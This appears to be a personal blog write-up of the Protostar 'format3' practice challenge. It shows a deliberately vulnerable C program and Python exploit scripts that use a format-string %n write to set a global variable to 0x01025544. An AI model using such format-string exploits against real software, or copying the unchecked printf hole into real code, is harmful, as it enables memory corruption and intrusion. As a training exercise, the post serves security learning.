---
layout: post
title: "Writing Large Values to Specific Targets: protostar format3"
date: 2019-9-10
---
The challenge is not much different from the last, the only difference here is that the value we will write to the target is much larger.
{% highlight c%}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
{% endhighlight %}
Once again, let's find the address of the target.
![format3-1](/assets/format3-1.png)
Unsurprisingly, this is at 0x80496f4. So we at least have that out of the way. 

The next thing we should do is try changing its value.
![format3-2](/assets/format3-2.png)
Ok, so there is works the same way as before. But now we need to make the value equal 0x01025544.
![format3-3](/assets/format3-3.png)
As one can see, it looks like we can't get the value of target to equal something as big as it needs to be. After a certain amount, the value just turns to 0. 

How then do we deal with this?

The link below basically does what I am trying to do, so it can show us the way.
https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/

Writing scripts is useful. We should begin writing an exploit script, because we are going to to be dealing with a lot of numbers.
{% highlight python %}
import struct 
import os

target = struct.pack("I", 0x080496f4)
junk = "%x"
payload = target + junk + "%x."*10 + "%n"

os.system("echo" + payload + " | /opt/protostar/bin/format3")
{% endhighlight %}
This is just doing what we were typing previously. 

The target is put in first then 11 bytes along the stack, we are at the spot we are dumbing our data.
![format3-4](/assets/format3-4.png)
Same result as before, at least this proves our program is doing as we should.

Now we need to find out how much the value junk is going to be. I think a good way to start this, since this is roughly the amount we are increasing our target by, would be with the value we want, 0x01025544.

This will be switched out of hex for the format specifier. I am going to use python to convert hex to decimal. I will also subtract our value by 0x4b, the number the target is equal to when we run this without our junk value.
![format3-5](/assets/format3-5.png)
This is what we will try using as my format specifier. 
{% highlight python %}
import struct 
import os

target = struct.pack("I", 0x080496f4)
junk = "%16930041x"
payload = target + junk + "%x."*10 + "%n"

os.system("echo" + payload + " | /opt/protostar/bin/format3")
{% endhighlight %}
Note that running this will take more time than any of the exploits up to this point. Have patience. Maybe go get some tea while it's running.

Running this, it doesn't quite become our value, it is one below. 
![format3-6](/assets/format3-6.png)
{% highlight python %}
import struct 
import os

target = struct.pack("I", 0x080496f4)
junk = "%16930042x"
payload = target + junk + "%x."*10 + "%n"

os.system("echo" + payload + " | /opt/protostar/bin/format3")
{% endhighlight %}
We increase the format specifier by 1.

And wait a whole 2 minutes.
![format3-7](/assets/format3-7.png)
Well, we did it. As for why subtracting 4b gave us a number off by one, I should have realized that likely since we put one into the number initially there, 4b is the amount stored plus one, input by our "%x", which has an implied 1.
The base number is likely 4a.

This challenge, I personally found difficult, but fun. It's good when you have to do a bit of digging, playing with a debugger and reading information. 


![aesthetic1](/assets/aesthetic1.jpg)
Anyways, time for some rest.